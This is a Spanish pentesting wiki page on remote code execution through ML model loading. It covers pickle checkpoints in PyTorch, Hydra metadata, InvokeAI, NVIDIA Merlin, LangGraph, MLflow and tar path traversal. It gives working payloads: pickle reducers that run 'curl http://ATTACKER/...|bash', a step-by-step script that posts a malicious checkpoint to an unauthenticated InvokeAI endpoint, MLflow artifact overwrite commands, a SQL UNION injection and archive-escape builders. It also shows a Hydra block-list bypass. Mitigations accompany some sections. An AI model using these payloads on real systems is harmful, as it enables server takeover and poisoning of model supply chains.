# RCE de modelos

{{#include ../banners/hacktricks-training.md}}

## Carga de modelos para RCE

Los modelos de Machine Learning suelen compartirse en distintos formatos, como ONNX, TensorFlow, PyTorch, etc. Estos modelos se pueden cargar en los equipos de los desarrolladores o en sistemas de producción para usarlos. Por lo general, los modelos no deberían contener código malicioso, pero en algunos casos se pueden usar para ejecutar código arbitrario en el sistema, ya sea como una funcionalidad prevista o debido a una vulnerabilidad en la biblioteca de carga de modelos.

La siguiente tabla enumera vulnerabilidades representativas de esta categoría:

| **Framework / Herramienta**        | **Vulnerabilidad (CVE, si está disponible)**                                                    | **Vector de RCE**                                                                                                                           | **Referencias**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Deserialización insegura en* `torch.load` **(CVE-2025-32434)**                                                              | Un pickle malicioso en el checkpoint del modelo provoca la ejecución de código (eludiendo la protección `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + descarga de un modelo malicioso provoca la ejecución de código; RCE mediante deserialización de Java en la API de administración                                        | |
| **NVIDIA Merlin Transformers4Rec** | Deserialización insegura de checkpoint mediante `torch.load` **(CVE-2025-23298)**                                           | Un checkpoint no confiable activa un reducer de pickle durante `load_model_trainer_states_from_checkpoint` → ejecución de código en el worker de ML            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + hook de extensión MessagePack inseguro **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Una clave `filter` controlada por el usuario inyecta sintaxis SQL/JSON-path, `UNION SELECT` crea una fila de checkpoint falsa y, luego, la deserialización de `msgpack` importa y llama código Python elegido por el atacante | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (YAML inseguro) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Cargar un modelo desde YAML usa `yaml.unsafe_load` (ejecución de código) <br> Cargar un modelo con una capa **Lambda** ejecuta código Python arbitrario          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (análisis de TFLite)                                                                                          | Un modelo `.tflite` manipulado provoca un desbordamiento de enteros → corrupción del heap (posible RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Cargar un modelo mediante `joblib.load` ejecuta pickle con un payload `__reduce__` del atacante                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (`np.load` inseguro) *disputada*                                                                              | El valor predeterminado de `numpy.load` permitía arrays de objetos pickleados: un `.npy/.npz` malicioso provoca la ejecución de código                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (recorrido de directorios) <br> **CVE-2024-5187** (recorrido de tar)                                                    | La ruta de los pesos externos del modelo ONNX puede escapar del directorio (lectura de archivos arbitrarios) <br> Un tar de modelo ONNX malicioso puede sobrescribir archivos arbitrarios (lo que puede provocar RCE) | |
| ONNX Runtime (riesgo de diseño)  | *(Sin CVE)* Operadores personalizados / flujo de control de ONNX                                                                                    | Un modelo con un operador personalizado requiere cargar código nativo del atacante; los grafos de modelos complejos abusan de la lógica para ejecutar cálculos no previstos   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (recorrido de rutas)                                                                                          | Usar la API de carga de modelos con `--model-control` habilitado permite el recorrido de rutas relativas para escribir archivos (p. ej., sobrescribir `.bashrc` para RCE)    | |
| **GGML (formato GGUF)**      | **CVE-2024-25664 … 25668** (múltiples desbordamientos del heap)                                                                         | Un archivo de modelo GGUF malformado provoca desbordamientos de búfer del heap en el parser, lo que permite la ejecución de código arbitrario en el sistema de la víctima                     | |
| **Keras (formatos antiguos)**   | *(Sin nuevo CVE)* Modelo Keras H5 heredado                                                                                         | El código de una capa Lambda en un modelo HDF5 (`.h5`) malicioso sigue ejecutándose al cargarlo (`safe_mode` de Keras no cubre el formato antiguo: «ataque de downgrade») | |
| **Otros** (general)        | *Fallo de diseño* – Serialización con Pickle                                                                                         | Muchas herramientas de ML (p. ej., formatos de modelo basados en pickle, `pickle.load` de Python) ejecutan código arbitrario incrustado en archivos de modelo si no se mitiga | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Metadatos no confiables pasados a `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Los metadatos/configuración del modelo controlados por el atacante establecen `_target_` en un callable arbitrario (p. ej., `builtins.exec`) → se ejecuta durante la carga, incluso con formatos «seguros» (`.safetensors`, `.nemo`, `config.json` del repositorio) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Además, hay algunos modelos basados en pickle de Python, como los que usa [PyTorch](https://github.com/pytorch/pytorch/security), que se pueden utilizar para ejecutar código arbitrario en el sistema si no se cargan con `weights_only=True`. Por lo tanto, cualquier modelo basado en pickle puede ser especialmente susceptible a este tipo de ataques, aunque no aparezca en la tabla anterior.

### Metadatos de Hydra → RCE (también funciona con safetensors)

`hydra.utils.instantiate()` importa y llama cualquier `_target_` con notación de puntos en un objeto de configuración/metadatos. Cuando bibliotecas como Hugging Face Transformers pasan **metadatos de modelos no confiables** a `instantiate()`, un atacante puede proporcionar un callable y argumentos que se ejecutan inmediatamente durante la carga del modelo (no se requiere pickle).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Ejemplo de payload (funciona en `model_config.yaml` de `.nemo`, `config.json` del repositorio o `__metadata__` dentro de `.safetensors`):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Puntos clave:
- Se activa antes de la inicialización del modelo en `restore_from/from_pretrained` de NeMo, los codificadores de HuggingFace de uni2TS y los cargadores de FlexTok.
- La lista de bloqueo de cadenas de Hydra se puede eludir mediante rutas de importación alternativas (p. ej., `enum.bltns.eval`) o nombres resueltos por la aplicación (p. ej., `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- FlexTok también analiza metadatos convertidos en cadenas con `ast.literal_eval`, lo que permite un DoS (consumo excesivo de CPU/memoria) antes de la llamada a Hydra.

### 🆕  RCE en InvokeAI mediante `torch.load` (CVE-2024-12029)

`InvokeAI` es una interfaz web popular de código abierto para Stable-Diffusion. Las versiones **5.3.1 – 5.4.2** exponen el endpoint REST `/api/v2/models/install`, que permite a los usuarios descargar y cargar modelos desde URL arbitrarias.<sup>[[1]](#references)</sup>

Internamente, el endpoint termina llamando a:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

Cuando el archivo proporcionado es un **checkpoint de PyTorch (`*.ckpt`)**, `torch.load` realiza una **deserialización de pickle**. Como el contenido proviene directamente de una URL controlada por el usuario, un atacante puede incrustar un objeto malicioso con un método `__reduce__` personalizado dentro del checkpoint; el método se ejecuta **durante la deserialización**, lo que permite la **ejecución remota de código (RCE)** en el servidor de InvokeAI.

La vulnerabilidad recibió la designación **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Guía paso a paso de explotación

1. Crea un checkpoint malicioso:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Aloja `payload.ckpt` en un servidor HTTP que controles (p. ej., `http://ATTACKER/payload.ckpt`).
3. Activa el endpoint vulnerable (no se requiere autenticación):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. Cuando InvokeAI descarga el archivo, llama a `torch.load()` → se ejecuta el gadget `os.system` y el atacante obtiene ejecución de código en el contexto del proceso de InvokeAI.

Exploit listo para usar: el módulo de **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` automatiza todo el proceso.<sup>[[3]](#references)</sup>

#### Condiciones

•  InvokeAI 5.3.1-5.4.2 (flag de escaneo predeterminado **false**)
•  El atacante puede acceder a `/api/v2/models/install`
•  El proceso tiene permisos para ejecutar comandos de shell

#### Mitigaciones

* Actualizar a **InvokeAI ≥ 5.4.3**: el parche establece `scan=True` de forma predeterminada y analiza si hay malware antes de la deserialización.<sup>[[2]](#references)</sup>
* Al cargar checkpoints mediante programación, usar `torch.load(file, weights_only=True)` o el nuevo helper [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Aplicar listas de permitidos / firmas para las fuentes de modelos y ejecutar el servicio con privilegios mínimos.

> ⚠️ Recuerda que **cualquier** formato basado en pickle de Python (incluidos muchos archivos `.pt`, `.pkl`, `.ckpt`, `.pth`) es intrínsecamente inseguro al deserializarlo desde fuentes no confiables.

---

Ejemplo de una mitigación provisional si debes mantener versiones antiguas de InvokeAI en ejecución detrás de un proxy inverso:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 RCE en NVIDIA Merlin Transformers4Rec mediante `torch.load` inseguro (CVE-2025-23298)

Transformers4Rec de NVIDIA (parte de Merlin) exponía un cargador de checkpoints inseguro que llamaba directamente a `torch.load()` con rutas proporcionadas por el usuario. Como `torch.load` depende de Python `pickle`, un checkpoint controlado por un atacante puede ejecutar código arbitrario mediante un reducer durante la deserialización.<sup>[[5]](#references)</sup>

Ruta vulnerable (antes de la corrección): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Por qué esto lleva a RCE: En Python pickle, un objeto puede definir un reducer (`__reduce__`/`__setstate__`) que devuelve una función invocable y argumentos. La función se ejecuta durante la deserialización. Si hay un objeto de este tipo en un checkpoint, se ejecuta antes de que se utilicen los pesos.

Ejemplo mínimo de checkpoint malicioso:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Vectores de entrega y radio de impacto:
- Checkpoints/modelos troyanizados compartidos mediante repositorios, buckets o registros de artefactos
- Pipelines automatizados de reanudación/despliegue que cargan checkpoints automáticamente
- La ejecución ocurre dentro de workers de entrenamiento/inferencia, a menudo con privilegios elevados (p. ej., como root en contenedores)

Solución: El commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) sustituyó la llamada directa a `torch.load()` por un deserializador restringido y con lista de permitidos, implementado en `transformers4rec/utils/serialization.py`. El nuevo loader valida los tipos/campos e impide que se invoquen callables arbitrarios durante la carga.<sup>[[7]](#references)</sup>

Recomendaciones defensivas específicas para checkpoints de PyTorch:
- No deserialices con pickle datos que no sean de confianza. Cuando sea posible, prefiere formatos no ejecutables como [Safetensors](https://huggingface.co/docs/safetensors/index) u ONNX.
- Si debes usar la serialización de PyTorch, asegúrate de que `weights_only=True` (compatible con versiones recientes de PyTorch) o usa un unpickler personalizado con una lista de permitidos, similar al parche de Transformers4Rec.<sup>[[4]](#references)</sup>
- Exige la procedencia/firmas del modelo y aísla la deserialización en un sandbox (seccomp/AppArmor; usuario sin privilegios de root; sistema de archivos restringido y sin tráfico de salida a la red).
- Supervisa la creación de procesos secundarios inesperados por parte de los servicios de ML al cargar checkpoints; rastrea el uso de `torch.load()`/`pickle`.

Referencias de la POC y de la versión vulnerable/parcheada:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Loader vulnerable anterior al parche: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC de checkpoint malicioso: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Loader posterior al parche: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Ejemplo: creación de un modelo malicioso de PyTorch

- Crea el modelo:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Cargar el modelo:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserialización de Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

FaceDetection-DSFD de Tencent expone un endpoint `resnet` que deserializa datos controlados por el usuario. ZDI confirmó que un atacante remoto puede inducir a una víctima a cargar una página/archivo malicioso, hacer que este envíe un blob serializado manipulado a ese endpoint y activar la deserialización como `root`, lo que provoca el compromiso total.

El flujo del exploit sigue el patrón típico del abuso de pickle:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Cualquier gadget al que se pueda acceder durante la deserialización (constructores, `__setstate__`, callbacks del framework, etc.) se puede weaponizar de la misma manera, independientemente de si el transporte era HTTP, WebSocket o un archivo depositado en un directorio supervisado.



### SQLi en el checkpointer de LangGraph → RCE de MessagePack

Esta cadena de ataque es interesante porque el atacante **no necesita subir un archivo de modelo malicioso**. En su lugar, la aplicación expone una **API de persistencia de agentes de IA** (`get_state_history(..., filter=...)`) y la entrada del usuario llega al generador de consultas del checkpointer.

#### 1. SQLi estructural en filtros de metadatos

Un patrón vulnerable de SQLite era:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

El valor se vincula más adelante, pero `query_key` se concatena en la **cadena de ruta JSON**, así que un `'` dentro de la clave del diccionario sale de `'$.{query_key}'` e inyecta SQL. La misma lección se aplica a **rutas JSON, identificadores, operadores, `LIMIT` y campos TTL**: los marcadores de posición solo protegen los valores, no la sintaxis estructural de la consulta.

#### 2. `UNION SELECT` puede apuntar a sinks posteriores, no solo al robo de datos

La consulta devuelve `type` y bytes de `checkpoint` serializados, que luego se consumen como:

```python
self.serde.loads_typed((type, checkpoint))
```

Eso significa que una SQLi en la cláusula `WHERE` puede inyectar una **fila de resultado falsa**:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Si el código posterior analiza, deserializa, escribe o ejecuta alguna columna seleccionada, vincula esas columnas con sus sinks. En este caso, la fila falsa convierte SQLi en **deserialización controlada por el atacante**.

#### 3. Los ganchos de extensión inseguros de MessagePack equivalen a gadgets de código

La ruta `msgpack` de LangGraph utilizaba un gancho de extensión personalizado que desempaquetaba una tupla anidada y ejecutaba:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Así, un objeto de extensión MessagePack que codifique algo equivalente a `("os", "system", "id > /tmp/pwned")` importa `os`, resuelve `system` y ejecuta el comando. Al revisar frameworks de AI, inspecciona los **revivificadores personalizados de MessagePack/JSON/pickle** en busca de imports dinámicos, reflexión o despacho arbitrario de callables.

#### 4. Patrón de auditoría práctica para frameworks de agentes

Revisa cualquier entrada controlada por el usuario que llegue a:
- APIs de historial de estado / memoria / reproducción / listado de checkpoints
- constructores de filtros estructurados que generen SQL o fragmentos de consultas de Redis
- deserializadores personalizados (`pickle`, `msgpack`, hooks de objetos de `json`, constructores de YAML)
- rutas de recuperación que confíen en las filas devueltas por la capa de persistencia

Esta cadena específica afectó a despliegues autohospedados de LangGraph que usaban checkpointers de **SQLite** o **Redis**, cuando usuarios no confiables podían controlar `filter`. Las versiones con el parche indicadas en la divulgación fueron `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` y `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

### Sobrescritura de artefactos PyFunc de MLflow para lograr RCE mediante pickle

Un PyFunc de MLflow creado a partir de un `PythonModel` puede almacenar el objeto serializado como `python_model.pkl`. Los metadatos del modelo identifican `mlflow.pyfunc.model` como su loader, y la implementación de MLflow usa este nombre de archivo para el modelo Python guardado. Por consiguiente, el acceso de escritura al almacén de artefactos puede convertirse en ejecución de código en otra aplicación que cargue el modelo posteriormente.<sup>[[17]](#references)[[18]](#references)</sup>

La cadena útil es **permiso de escritura en los artefactos → reemplazar el pickle → hacer que un consumidor de inferencia lo vuelva a cargar**. Para un experimento que use una raíz proxificada `mlflow-artifacts:/...`, enumera el experimento, la ejecución y la ruta del artefacto del modelo. El servidor de tracking expone `GET` y `PUT` en `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>`.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

Un reducer mínimo puede ejecutar un comando en cuanto el consumidor deserializa el artefacto con pickle. Generar el payload con la versión de Python declarada en `MLmodel` evita problemas de compatibilidad.<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

Activa la operación que **carga el modelo existente**, como la predicción, la puntuación o el despliegue. No vuelvas a entrenarlo primero, porque el entrenamiento podría reemplazar el artifact malicioso por un modelo nuevo. Un error de la aplicación no descarta la explotación: el reducer devuelve el estado de salida entero del comando en lugar de un modelo utilizable. Empieza con un efecto secundario observable, como ICMP o una callback HTTP, y luego sustitúyelo por el payload final.<sup>[[20]](#references)</sup>

Durante la evaluación, distingue entre el permiso para crear una ejecución y el permiso para sobrescribir artifacts que pertenecen a otra ejecución. Revisa la autenticación y los permisos de actualización por ejecución, inspecciona las modificaciones inesperadas de `python_model.pkl` y considera la procedencia e integridad del modelo como parte del límite de ejecución. El código actual de MLflow también admite configurar `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` y recomienda usar artifacts de models-from-code en lugar de cargar datos de cloudpickle.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

### Servidores de modelos expuestos e infraestructura de ML

Cargar un modelo malicioso no es la única forma de ejecutar código en infraestructura de ML. Las API de envío de trabajos, los endpoints de validación de código y las descargas del registro de modelos de servicios de IA autoalojados pueden permitir la ejecución de código sin ningún archivo de modelo. Consulta [Servicios de IA autoalojados expuestos](AI-Exposed-Self-Hosted-AI-Services.md).

## Modelos a Path Traversal

Como se comenta en [**esta entrada del blog**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), la mayoría de los formatos de modelo utilizados por distintos frameworks de IA se basan en archivos comprimidos, normalmente `.zip`. Por lo tanto, podría ser posible abusar de estos formatos para realizar ataques de Path Traversal y leer archivos arbitrarios del sistema donde se carga el modelo.<sup>[[16]](#references)</sup>

Por ejemplo, con el siguiente código puedes crear un modelo que creará un archivo en el directorio `/tmp` al cargarse:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

O bien, con el siguiente código puedes crear un modelo que creará un symlink al directorio `/tmp` cuando se cargue:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Análisis en profundidad: deserialización de .keras en Keras y búsqueda de gadgets

Para una guía centrada en los aspectos internos de .keras, el RCE en capas Lambda, el problema de importación arbitraria en ≤ 3.8 y la búsqueda de gadgets dentro de la allowlist después de la corrección, consulta:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [Blog de OffSec – "CVE-2024-12029 – Deserialización de datos no confiables en InvokeAI"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [Commit de corrección de InvokeAI 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Documentación del módulo de Metasploit de Rapid7](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – consideraciones de seguridad para torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [Blog de ZDI – CVE-2025-23298: cómo obtener ejecución remota de código en NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [Aviso de ZDI: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Commit de corrección de Transformers4Rec b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Cargador vulnerable antes de la corrección (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC de checkpoint malicioso (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Cargador después de la corrección (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Transformers de Hugging Face](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Ejecución remota de código con formatos y bibliotecas modernos de AI/ML](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Documentación de Hydra instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Commit de block-list de Hydra (advertencia sobre RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – De SQLi a RCE: explotación del checkpointer de LangGraph](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Cómo convertir errores de archive slip en recompensas de alto valor por fallos de AI/ML](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Aviso de Snyk y prueba de concepto de PyFunc – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [Código fuente de MLflow – `model.py` de PyFunc](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [API REST de MLflow – endpoints de descarga y carga de artefactos](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../banners/hacktricks-training.md}}
